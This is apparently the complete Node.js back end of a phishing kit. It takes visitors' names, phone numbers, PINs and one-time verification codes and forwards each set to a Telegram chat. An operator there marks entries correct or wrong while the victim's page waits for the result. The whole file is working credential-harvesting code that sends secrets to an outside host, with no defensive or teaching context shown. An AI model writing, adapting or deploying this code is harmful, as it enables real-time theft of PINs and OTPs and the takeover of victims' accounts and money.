require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory approvals
const approvedPins = {};   // pin: null | true | false
const approvedCodes = {};  // code: null | true | false

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ---------------------- Telegram helper ----------------------
async function sendTelegramMessage(text, inlineKeyboard = null) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
        if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
        const res = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
        console.log('✅ Telegram message sent:', res.data);
    } catch (err) {
        console.error('❌ Failed to send Telegram message:', err.message);
    }
}

// ---------------------- PIN FLOW ----------------------

// Submit PIN
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin } = req.body;
    console.log('📩 /submit-pin HIT', { name, phone, pin });

    approvedPins[pin] = null; // pending

    const inlineKeyboard = [
        [
            { text: '✅ Correct PIN', callback_data: `correct_pin:${pin}` },
            { text: '❌ Wrong PIN', callback_data: `wrong_pin:${pin}` }
        ]
    ];

    sendTelegramMessage(`🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, inlineKeyboard);

    res.json({ status: 'pending' });
});

// Poll PIN approval
app.get('/check-pin/:pin', (req, res) => {
    const pin = req.params.pin;
    res.json({ approved: approvedPins[pin] }); // null=pending, true=correct, false=wrong
});

// ---------------------- CODE FLOW ----------------------

// Submit code
app.post('/submit-code', (req, res) => {
    const { name, phone, code } = req.body;  // <-- include name and phone
    console.log('📩 /submit-code HIT', { name, phone, code });

    approvedCodes[code] = false;

    const inlineKeyboard = [
        [
            { text: '✅ Correct Code', callback_data: `correct_code:${code}` },
            { text: '❌ Wrong Code', callback_data: `wrong_code:${code}` }
        ]
    ];

    // Send name, phone, and code to Telegram
    const msg = `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`;
    sendTelegramMessage(msg, inlineKeyboard);

    res.json({ status: 'pending' });
});


// Poll CODE approval
app.get('/check-code/:code', (req, res) => {
    const code = req.params.code;
    res.json({ approved: approvedCodes[code] }); // null=pending, true=correct, false=wrong
});

// ---------------------- TELEGRAM WEBHOOK ----------------------
app.post('/telegram-webhook', express.json(), (req, res) => {
    const callback = req.body?.callback_query;
    if (!callback) return res.sendStatus(200);

    console.log('📩 Telegram callback received:', JSON.stringify(req.body, null, 2));

    const [action, value] = callback.data.split(':');

    // PIN actions
    if (action === 'correct_pin') approvedPins[value] = true;
    if (action === 'wrong_pin') approvedPins[value] = false;

    // CODE actions
    if (action === 'correct_code') approvedCodes[value] = true;
    if (action === 'wrong_code') approvedCodes[value] = false;

    sendTelegramMessage(`Action received: ${callback.data}`);

    return res.sendStatus(200);
});

// ---------------------- Start Server ----------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
